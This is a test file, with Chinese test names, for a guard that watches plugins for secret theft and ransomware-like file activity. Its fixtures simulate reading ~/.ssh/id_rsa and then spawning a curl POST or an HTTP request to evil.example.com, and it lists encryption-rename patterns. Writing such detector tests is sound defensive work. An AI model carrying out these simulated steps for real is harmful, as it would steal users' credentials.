import { describe, expect, it, vi } from 'vitest'
import {
  ExfilLedger, isEncryptionRename, isNoisePath, resetExfilLedger,
} from '../lib/guard/exfil-ledger.js'
import {
  DEFAULT_HOOK_CONFIG, patchModule, patchNetworkModule, isTrackedNetHost, chunkBytes,
} from '../lib/guard/runtime-hooks.js'
import type { LedgerFsEvent, LedgerNetEvent } from '../lib/guard/exfil-ledger.js'

function fsEvt(patch: Partial<LedgerFsEvent> & { plugin: string }): LedgerFsEvent {
  return {
    module: 'fs',
    op: 'readFile',
    target: '/home/u/.ssh/id_rsa',
    paths: [],
    sensitive: true,
    bytes: 0,
    ...patch,
  }
}

function netEvt(patch: Partial<LedgerNetEvent> & { plugin: string }): LedgerNetEvent {
  return {
    module: 'http',
    op: 'request',
    hostname: 'evil.example.com',
    bytes: 0,
    ...patch,
  }
}

describe('N3 台账 ExfilLedger：外泄字节计数', () => {
  it('敏感读字节累积（readFileSync 结果长度）', () => {
    const l = new ExfilLedger()
    const r = l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 2048 }))
    expect(l.snapshot('a')).toEqual({ sensitiveReadBytes: 2048, netWriteBytes: 0 })
    expect(r.some(a => a.kind === 'n3-exfil')).toBe(false)
  })
it('非敏感读不计字节', () => {
    const l = new ExfilLedger()
    l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', sensitive: false, target: '/tmp/x', bytes: 9999 }))
    expect(l.snapshot('a')?.sensitiveReadBytes).toBe(0)
  })
it('无归因操作不建桶（官方/宿主/无主）', () => {
    const l = new ExfilLedger()
    const r = l.observeFs({ module: 'fs', op: 'readFileSync', target: '/home/u/.ssh/id_rsa', paths: [], sensitive: true, bytes: 100 })
    expect(r).toEqual([])
  })
it('不同插件计数器隔离', () => {
    const l = new ExfilLedger()
    l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 100 }))
    l.observeFs(fsEvt({ plugin: 'b', op: 'readFileSync', bytes: 500 }))
    expect(l.snapshot('a')?.sensitiveReadBytes).toBe(100)
    expect(l.snapshot('b')?.sensitiveReadBytes).toBe(500)
  })
  it('敏感读 + 网写都发生但间隔长/量级不匹配 → 基础黄 n3-exfil（不误触序列红）', () => {
    vi.useFakeTimers()
    try {
      vi.setSystemTime(new Date(2026, 0, 1, 0, 0, 0))
      const l = new ExfilLedger({ exfilMinBytes: 512 })
      l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 2048 }))
      vi.advanceTimersByTime(40_000) // 读后 40s 才写：不构成 30s 序列签名
      const alarms = l.observeNet(netEvt({ plugin: 'a', bytes: 100_000 })) // 比值 48：不触发量级匹配
      expect(alarms.some(a => a.kind === 'n3-exfil' && a.severity === 'yellow')).toBe(true)
      expect(alarms.some(a => a.kind === 'n3-exfil-match')).toBe(false)
      expect(alarms.some(a => a.kind === 'n3-seq-read-net')).toBe(false)
    } finally {
      vi.useRealTimers()
    }
  })
it('量级相近（读 2KB 写 2.5KB）→ 红 n3-exfil-match（疑似整包外传）', () => {
    const l = new ExfilLedger({ exfilMinBytes: 512 })
    l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 2048 }))
    const alarms = l.observeNet(netEvt({ plugin: 'a', bytes: 2500 }))
    expect(alarms.some(a => a.kind === 'n3-exfil-match' && a.severity === 'red')).toBe(true)
  })
  it('量级悬殊（读 2KB 写 1MB）→ 不红（不误报正常大流量上传）', () => {
    vi.useFakeTimers()
    try {
      vi.setSystemTime(new Date(2026, 0, 1, 0, 0, 0))
      const l = new ExfilLedger({ exfilMinBytes: 512 })
      l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 2048 }))
      vi.advanceTimersByTime(40_000)
      const alarms = l.observeNet(netEvt({ plugin: 'a', bytes: 1024 * 1024 }))
      expect(alarms.some(a => a.kind === 'n3-exfil-match')).toBe(false)
      expect(alarms.some(a => a.kind === 'n3-seq-read-net')).toBe(false)
      expect(alarms.some(a => a.kind === 'n3-exfil' && a.severity === 'yellow')).toBe(true)
    } finally {
      vi.useRealTimers()
    }
  })
})

describe('N3 台账：行为序列签名', () => {
  it('READ_SECRET → SPAWN(curl) 30s 内 → 红 n3-seq-read-spawn', () => {
    const l = new ExfilLedger()
    l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 100 }))
    const alarms = l.observeFs(fsEvt({
      plugin: 'a',
      module: 'child_process',
      op: 'spawn',
      target: 'curl',
      paths: ['curl', '-X', 'POST', 'https://evil.example.com'],
      sensitive: false,
      bytes: 0,
    }))
    expect(alarms.some(a => a.kind === 'n3-seq-read-spawn' && a.severity === 'red')).toBe(true)
  })
it('READ_SECRET → NET_WRITE 30s 内 → 红 n3-seq-read-net', () => {
    const l = new ExfilLedger()
    l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 100 }))
    const alarms = l.observeNet(netEvt({ plugin: 'a', bytes: 50 }))
    expect(alarms.some(a => a.kind === 'n3-seq-read-net' && a.severity === 'red')).toBe(true)
  })
it('序列超窗（> seqWindowMs）→ 只黄不红（慢速/非紧邻不算强证据）', () => {
    vi.useFakeTimers()
    try {
      vi.setSystemTime(new Date(2026, 0, 1, 0, 0, 0))
      const l = new ExfilLedger({ seqWindowMs: 30_000 })
      l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 100 }))
      vi.advanceTimersByTime(40_000)
      const alarms = l.observeNet(netEvt({ plugin: 'a', bytes: 5000 }))
      expect(alarms.some(a => a.kind === 'n3-seq-read-net')).toBe(false)
      expect(alarms.some(a => a.kind === 'n3-exfil' && a.severity === 'yellow')).toBe(true)
    } finally {
      vi.useRealTimers()
    }
  })
})
describe('N3 台账：破坏签名族', () => {
  it('MASS_DELETE：窗口内删除超阈值 → 黄', () => {
    const l = new ExfilLedger({ windowMs: 5000, massDeleteN: 5 })
    for (let i = 0; i < 5; i++) {
      const alarms = l.observeFs(fsEvt({
        plugin: 'extorter',
        op: 'unlink',
        target: '/home/u/data/file-' + i + '.txt',
        paths: ['/home/u/data/file-' + i + '.txt'],
        sensitive: false,
        bytes: 0,
      }))
      if (i === 4) expect(alarms.some(a => a.kind === 'n3-mass-delete')).toBe(true)
      else expect(alarms.some(a => a.kind === 'n3-mass-delete')).toBe(false)
    }
  })
it('MASS_DELETE：node_modules 下删除被降噪（构建/清理不算破坏）', () => {
    const l = new ExfilLedger({ windowMs: 5000, massDeleteN: 5 })
    for (let i = 0; i < 6; i++) {
      l.observeFs(fsEvt({
        plugin: 'builder',
        op: 'unlink',
        target: '/proj/node_modules/pkg-' + i + '/index.js',
        paths: ['/proj/node_modules/pkg-' + i + '/index.js'],
        sensitive: false,
        bytes: 0,
      }))
    }
    // node_modules 删除全部被降噪：不建桶/不触发（判据：6 次删后无 mass-delete）
    const alarms = l.observeFs(fsEvt({ plugin: 'builder', op: 'unlink', target: '/proj/a.js', paths: ['/proj/a.js'], sensitive: false, bytes: 0 }))
    expect(alarms.some(a => a.kind === 'n3-mass-delete')).toBe(false)
  })
it('MASS_RENAME_EXT：改名 + 加密标记 → 黄', () => {
    const l = new ExfilLedger({ windowMs: 5000, massRenameN: 3 })
    for (let i = 0; i < 3; i++) {
      const alarms = l.observeFs(fsEvt({
        plugin: 'extorter',
        op: 'rename',
        target: '/home/u/data/doc-' + i + '.txt',
        paths: ['/home/u/data/doc-' + i + '.txt', '/home/u/data/doc-' + i + '.txt.encrypted'],
        sensitive: false,
        bytes: 0,
      }))
      if (i === 2) expect(alarms.some(a => a.kind === 'n3-mass-rename')).toBe(true)
    }
  })
it('改名目标无加密标记 → 不触发（正常文件整理）', () => {
    const l = new ExfilLedger({ windowMs: 5000, massRenameN: 3 })
    for (let i = 0; i < 3; i++) {
      l.observeFs(fsEvt({
        plugin: 'organizer',
        op: 'rename',
        target: '/home/u/a-' + i + '.tmp',
        paths: ['/home/u/a-' + i + '.tmp', '/home/u/b-' + i + '.txt'],
        sensitive: false,
        bytes: 0,
      }))
    }
    const alarms = l.observeFs(fsEvt({ plugin: 'organizer', op: 'rename', target: '/home/u/c.tmp', paths: ['/home/u/c.tmp', '/home/u/d.txt'], sensitive: false, bytes: 0 }))
    expect(alarms.some(a => a.kind === 'n3-mass-rename')).toBe(false)
  })
it('IN_PLACE_OVERWRITE：读后原地覆写达量 → 黄（原地加密特征）', () => {
    const l = new ExfilLedger({ windowMs: 5000, inPlaceN: 3 })
    for (let i = 0; i < 3; i++) {
      l.observeFs(fsEvt({ plugin: 'extorter', op: 'readFileSync', target: '/home/u/d/f-' + i + '.jpg', paths: ['/home/u/d/f-' + i + '.jpg'], sensitive: false, bytes: 1000 }))
      const alarms = l.observeFs(fsEvt({ plugin: 'extorter', op: 'writeFile', target: '/home/u/d/f-' + i + '.jpg', paths: ['/home/u/d/f-' + i + '.jpg'], sensitive: false, bytes: 1000 }))
      if (i === 2) expect(alarms.some(a => a.kind === 'n3-in-place')).toBe(true)
    }
  })
it('WRITE_AMPLIFY：窗口内写入巨量 → 黄', () => {
    const l = new ExfilLedger({ windowMs: 5000, writeAmplifyBytes: 20_000 })
    for (let i = 0; i < 5; i++) {
      l.observeFs(fsEvt({
        plugin: 'writer',
        op: 'appendFile',
        target: '/home/u/big-' + i + '.bin',
        paths: ['/home/u/big-' + i + '.bin'],
        sensitive: false,
        bytes: 5000,
      }))
    }
    const alarms = l.observeFs(fsEvt({ plugin: 'writer', op: 'appendFile', target: '/home/u/big-5.bin', paths: ['/home/u/big-5.bin'], sensitive: false, bytes: 0 }))
    expect(alarms.some(a => a.kind === 'n3-write-amplify' && a.severity === 'yellow')).toBe(true)
  })
it('组合 MASS_DELETE + MASS_RENAME_EXT → 红 n3-ransom；单个 yellow 被吞', () => {
    const l = new ExfilLedger({ windowMs: 5000, massDeleteN: 3, massRenameN: 2 })
    for (let i = 0; i < 3; i++) {
      l.observeFs(fsEvt({ plugin: 'extorter', op: 'unlink', target: '/home/u/d/f-' + i + '.txt', paths: ['/home/u/d/f-' + i + '.txt'], sensitive: false, bytes: 0 }))
    }
    let alarms: ReturnType<typeof l.observeFs> = []
    for (let i = 0; i < 2; i++) {
      alarms = l.observeFs(fsEvt({
        plugin: 'extorter',
        op: 'rename',
        target: '/home/u/d/f-' + i + '.txt',
        paths: ['/home/u/d/f-' + i + '.txt', '/home/u/d/g-' + i + '.txt.crypt'],
        sensitive: false,
        bytes: 0,
      }))
    }
    expect(alarms.some(a => a.kind === 'n3-ransom' && a.severity === 'red')).toBe(true)
    expect(alarms.some(a => a.kind === 'n3-mass-delete')).toBe(false)
    expect(alarms.some(a => a.kind === 'n3-mass-rename')).toBe(false)
  })
  it('markSuspected 后阈值降为最低（蜜罐/金丝雀确认恶意）', () => {
    const l = new ExfilLedger({ windowMs: 5000, massDeleteN: 20 })
    l.markSuspected('extorter')
    for (let i = 0; i < 5; i++) {
      const alarms = l.observeFs(fsEvt({
        plugin: 'extorter',
        op: 'unlink',
        target: '/home/u/d/f-' + i + '.txt',
        paths: ['/home/u/d/f-' + i + '.txt'],
        sensitive: false,
        bytes: 0,
      }))
      if (i === 4) expect(alarms.some(a => a.kind === 'n3-mass-delete')).toBe(true)
    }
  })
})
describe('N3 台账：工具函数与生命周期', () => {
  it('prune 清理超时空闲台账（TTL）', () => {
    vi.useFakeTimers()
    try {
      vi.setSystemTime(new Date(2026, 0, 1, 0, 0, 0))
      const l = new ExfilLedger({ ttlMs: 1000 })
      l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 1 }))
      expect(l.snapshot('a')).toBeDefined()
      vi.advanceTimersByTime(5000)
      l.observeNet(netEvt({ plugin: 'b', bytes: 1 }))
      expect(l.snapshot('a')).toBeUndefined()
    } finally {
      vi.useRealTimers()
    }
  })
it('isEncryptionRename：.encrypted / .crypt / 随机 hex 扩展名', () => {
    expect(isEncryptionRename('/a/x.txt', '/a/x.txt.encrypted')).toBe(true)
    expect(isEncryptionRename('/a/x.txt', '/a/x.bak.crypt')).toBe(true)
    expect(isEncryptionRename('/a/x.txt', '/a/x.4f3a9c1de2b8f6a7')).toBe(true)
    expect(isEncryptionRename('/a/x.txt', '/a/y.txt')).toBe(false)
    expect(isEncryptionRename('/a/x.txt', '/a/x.txt')).toBe(false)
  })
it('isNoisePath：node_modules/.git/构建产物/锁文件/临时文件', () => {
    expect(isNoisePath('/p/node_modules/a/index.js')).toBe(true)
    expect(isNoisePath('/p/.git/objects/xx')).toBe(true)
    expect(isNoisePath('/p/dist/bundle.js')).toBe(true)
    expect(isNoisePath('/p/build/x.js')).toBe(true)
    expect(isNoisePath('/home/u/x.lock')).toBe(true)
    expect(isNoisePath('/home/u/.secrets.ts.165387.abc.tmpdir')).toBe(true)
    expect(isNoisePath('/home/u/credentials.yaml')).toBe(false)
  })
it('resetExfilLedger 清空模块级单例', async () => {
    const { exfilLedger } = await import('../lib/guard/exfil-ledger.js')
    exfilLedger.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 1 }))
    expect(exfilLedger.snapshot('a')).toBeDefined()
    resetExfilLedger()
    expect(exfilLedger.snapshot('a')).toBeUndefined()
  })
})

describe('N3 接线：hooks observe 通道', () => {
  it('patchModule 假实现：注入返回值，事件带字节与敏感标记', () => {
    const mod: Record<string, unknown> = {
      readFileSync: (p: string) => (p.includes('.ssh') ? Buffer.from('AAAA-BBBB-CCCC') : Buffer.alloc(0)),
    }
    const events: LedgerFsEvent[] = []
    patchModule(mod, 'fs', DEFAULT_HOOK_CONFIG, () => {}, () => new Map(), (evt) => events.push(evt))
    ;(mod.readFileSync as (p: string) => Buffer)('/home/u/.ssh/id_rsa')
    expect(events).toHaveLength(1)
    expect(events[0].bytes).toBe(14)
    expect(events[0].sensitive).toBe(true)
    expect(events[0].target).toBe('/home/u/.ssh/id_rsa')
  })
  it('patchModule：createReadStream 流 data 分块计数（真实流对象）', async () => {
    const { Readable } = await import('node:stream')
    const mod: Record<string, unknown> = {
      createReadStream: () => Readable.from([Buffer.from('chunk-one'), Buffer.from('chunk-two')]),
    }
    const events: LedgerFsEvent[] = []
    patchModule(mod, 'fs', DEFAULT_HOOK_CONFIG, () => {}, () => new Map(), (evt) => events.push(evt))
    let lastEvent: LedgerFsEvent | undefined
    // 直接调用包装后的 createReadStream，再消费
    const wrappedStream = (mod.createReadStream as () => NodeJS.ReadableStream)('/home/u/.ssh/id_rsa')
    ;(wrappedStream as import('node:stream').Readable).on('data', (c: Buffer) => { lastEvent = ({ bytes: c.length } as unknown) as LedgerFsEvent })
    await new Promise<void>((resolve) => {
      (wrappedStream as import('node:stream').Readable).on('end', () => resolve())
      ;(wrappedStream as import('node:stream').Readable).resume()
    })
    expect(events.length).toBeGreaterThan(0)
    expect(events.reduce((s, e) => s + e.bytes, 0)).toBe(18)
    expect(lastEvent).toBeDefined()
  })
it('patchNetworkModule：包装请求 write/end 按 chunk 上报字节', () => {
    const mod: Record<string, unknown> = {}
    const events: LedgerNetEvent[] = []
    let req: { write: (c: string) => boolean; end: (c?: string) => void } | null = null
    mod.request = (url: string) => {
      const r = { last: '' } as { last: string; write: (c: string) => boolean; end: (c?: string) => void }
      r.write = (c: string) => { r.last += c; return true }
      r.end = (c?: string) => { if (c !== undefined) r.last += c }
      req = r
      return r
    }
    patchNetworkModule(mod, 'http', DEFAULT_HOOK_CONFIG, () => {}, () => new Map(), (evt) => events.push(evt))
    ;(mod.request as (u: string) => unknown)('http://evil.example.com/x')
    req!.write('hello')
    req!.end('world')
    expect(events.filter(e => e.bytes > 0).map(e => e.bytes)).toEqual([5, 5])
    expect(events[0].hostname).toBe('evil.example.com')
  })
  it('attachWriteCounter 不重复包装（同一对象二次调用不叠加）', async () => {
    const { attachWriteCounter } = await import('../lib/guard/runtime-hooks.js')
    const obj = {
      n: 0,
      write(c: string) { return true },
      end() {},
    } as { n: number; write: (c: string) => boolean; end: (c?: string) => void }
    let count = 0
    attachWriteCounter(obj, () => { count++ })
    attachWriteCounter(obj, () => { count++ })
    obj.write('x')
    obj.end('y')
    expect(count).toBe(2)
  })
it('isTrackedNetHost：回环/白名单不算，其余算', () => {
    expect(isTrackedNetHost('evil.example.com')).toBe(true)
    expect(isTrackedNetHost('registry.npmjs.org')).toBe(false)
    expect(isTrackedNetHost('localhost')).toBe(false)
    expect(isTrackedNetHost('unix-socket')).toBe(false)
  })
it('chunkBytes：string/Buffer/Uint8Array/未知', () => {
    expect(chunkBytes('abcd')).toBe(4)
    expect(chunkBytes(Buffer.from('efgh'))).toBe(4)
    expect(chunkBytes(new Uint8Array([1, 2, 3]))).toBe(3)
    expect(chunkBytes(42)).toBe(0)
    expect(chunkBytes(undefined)).toBe(0)
  })
})
describe('N3 台账：n3-exfil 终身误报修复', () => {
  it('读后远超关联窗口（> exfilAssocWindowMs）再写 → 不再黄', () => {
    vi.useFakeTimers()
    try {
      vi.setSystemTime(new Date(2026, 0, 1, 0, 0, 0))
      const l = new ExfilLedger()
      l.observeFs(fsEvt({ plugin: 'a', op: 'readFileSync', bytes: 2048 }))
      vi.advanceTimersByTime(200_000)
      const alarms = l.observeNet(netEvt({ plugin: 'a', bytes: 100_000 }))
      expect(alarms.some(a => a.kind === 'n3-exfil' && a.severity === 'yellow')).toBe(false)
      expect(alarms.some(a => a.kind === 'n3-seq-read-net')).toBe(false)
      expect(alarms.some(a => a.kind === 'n3-exfil-match')).toBe(false)
    } finally {
      vi.useRealTimers()
    }
  })
})
